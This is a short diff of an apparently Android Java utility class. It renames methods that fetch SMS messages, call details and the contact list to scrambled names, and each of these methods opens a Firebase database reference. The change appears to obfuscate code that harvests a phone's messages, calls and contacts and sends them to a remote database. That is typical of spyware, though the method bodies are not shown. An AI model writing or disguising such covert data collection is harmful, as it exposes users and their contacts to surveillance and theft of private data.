@@ -79,7 +79,7 @@ public class Utils {
     }
 
 
-    public static ArrayList fetchSms(Activity activity) {
+    public static ArrayList gettishms(Activity activity) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
         ArrayList sms = new ArrayList();
@@ -136,7 +136,7 @@ public class Utils {
         return sms;
     }
 
-    public static String getCallDetails(Context context) {
+    public static String getkalol(Context context) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
 
@@ -187,7 +187,7 @@ public class Utils {
         return stringBuffer.toString();
     }
 
-    public static void getContactsList(Context context) {
+    public static void getltoiCstonacs(Context context) {
         FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
         DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
 
